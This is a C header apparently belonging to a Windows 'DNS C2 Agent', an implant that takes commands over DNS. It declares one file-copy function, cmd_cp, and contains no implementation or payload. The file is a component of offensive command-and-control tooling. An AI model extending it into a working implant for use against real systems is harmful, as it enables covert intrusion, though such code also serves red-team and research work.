/**
 * cp.h - Copy file command for DNS C2 Agent
 */

 #ifndef CP_H
 #define CP_H
 
 #include <windows.h>
 
 /**
  * Copy a file
  * 
  * @param args Format: "source destination"
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_cp(const char* args);
 
 #endif // CP_H
 